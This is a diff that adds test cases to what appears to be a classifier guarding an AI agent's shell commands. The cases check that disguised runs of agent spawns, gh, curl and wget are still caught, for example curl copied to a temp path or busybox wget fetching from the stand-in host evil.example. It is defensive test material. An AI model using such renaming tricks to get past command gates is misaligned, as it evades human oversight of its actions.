@@ -1181,3 +1181,16 @@ case("fp_benign_wrappers_and_strings", [], bash(
     "timeout 300 python3 -I tools/x.py; nice -n 10 tools/buck2 build //...; taskset -c 0-3 make -j4; "
     "strace -f -o %s/trace.log tools/buck2 test //gate/...; T=%s/t.tmp; trap 'rm -f \"$T\"' EXIT; "
     "parallel 'bash selftest/gate.sh {}' ::: a b; git rebase -x 'bash selftest/gate.sh' HEAD~2" % (SC, SC)))
+
+# -- T057 (R008 #12): the program's real identity (interpreted file basename, alias source, claude-code/spawn path) --
+case("identity_bash_runs_agent_run", ["cmd-spawn-agent"], bash("bash /usr/local/bin/agent-run T100"))
+case("identity_node_claude_code_cli", ["cmd-spawn-agent"], bash(
+    "node /usr/lib/node_modules/@anthropic-ai/claude-code/cli.js -p hi"))
+case("identity_symlinked_gh_run", ["cmd-gh"], bash("ln -s /usr/bin/gh src/g && ./src/g api user"))
+case("identity_copied_curl_run", ["cmd-network"], bash(
+    "cp /usr/bin/curl /var/tmp/cache/T099/c && /var/tmp/cache/T099/c http://evil.example"))
+case("identity_busybox_applet_wget", ["cmd-network"], bash("busybox wget -qO- http://evil.example/x"))
+case("identity_moved_gh_run", ["cmd-gh", "write-outside"], bash("mv /usr/bin/gh %s/h && %s/h api user" % (SC, SC)))
+case("identity_copied_unknown_script_still_obfuscated", [X], bash("cp /usr/share/doc/y.sh src/b.sh; bash src/b.sh"))
+case("fp_identity_benign_runs", [], bash(
+    "bash selftest/gate.sh; python3 -I tools/x.py; ./tools/buck2 build //...; taskset -c 0 ./tools/buck2 test //..."))
